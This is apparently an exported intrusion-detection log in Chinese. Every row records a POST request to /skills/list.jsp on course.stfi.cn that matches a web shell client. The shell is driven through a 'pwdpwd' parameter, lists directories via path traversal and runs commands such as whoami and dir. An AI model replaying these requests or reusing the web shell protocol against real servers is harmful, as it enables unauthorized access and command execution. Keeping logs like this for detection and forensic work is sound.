 出入口	事件名	源IP	目的IP	源端口	目的端口	时间	设备名称	返回值 
未知, id=0	00002787	172.97.184.205	118.114.242.106	60535	1080	20160421031144	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 18\0D\0ACache-Control: no-cache\0D\0A\0D\0Apwdpwd=A&z0=GB2312
未知, id=0	00002787	172.97.184.205	118.114.242.106	60535	1080	20160421031144	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 131\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cbin%5C%5Ctomcat%5C%5Cwebapps%5C%5C..%5C%5C..%5C%5C..%5C%5Cweb%5C%5Csuite%5C%5Cskills%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60535	1080	20160421031151	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 119\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cbin%5C%5Ctomcat%5C%5Cwebapps%5C%5C..%5C%5C..%5C%5C..%5C%5Cweb%5C%5Csuite%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60535	1080	20160421031209	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 165\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=M&z0=GB2312&z1=/ccmd&z2=cd+%2Fd+%22E%3A%5Cdms%5Cbin%5Ctomcat%5Cwebapps%5C..%5C..%5C..%5Cweb%5Csuite%5Cskills%5C%22%26whoami%26echo+%5BS%5D%26cd%26echo+%5BE%5D
未知, id=0	00002787	172.97.184.205	118.114.242.106	60535	1080	20160421031247	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 145\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=M&z0=GB2312&z1=/ccmd&z2=cd+%2Fd+%22E%3A%5Cdms%5Cweb%5Csuite%5Cskills%5C%22%26dir+%2Fs+%2Fb+e%3A%5C1.gif%26echo+%5BS%5D%26cd%26echo+%5BE%5D
未知, id=0	00002787	172.97.184.205	118.114.242.106	60535	1080	20160421031445	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 131\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cbin%5C%5Ctomcat%5C%5Cwebapps%5C%5C..%5C%5C..%5C%5C..%5C%5Cweb%5C%5Csuite%5C%5Cimages%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60535	1080	20160421031527	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 141\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cbin%5C%5Ctomcat%5C%5Cwebapps%5C%5C..%5C%5C..%5C%5C..%5C%5Cweb%5C%5Csuite%5C%5Cimages%5C%5Cjpkc%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60535	1080	20160421031532	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 143\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cbin%5C%5Ctomcat%5C%5Cwebapps%5C%5C..%5C%5C..%5C%5C..%5C%5Cweb%5C%5Csuite%5C%5Cimages%5C%5Cportal%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60560	1080	20160421031636	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 32\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60560	1080	20160421031643	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 41\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60560	1080	20160421031649	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 50\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60560	1080	20160421031654	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 61\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Csuite%5C%5C
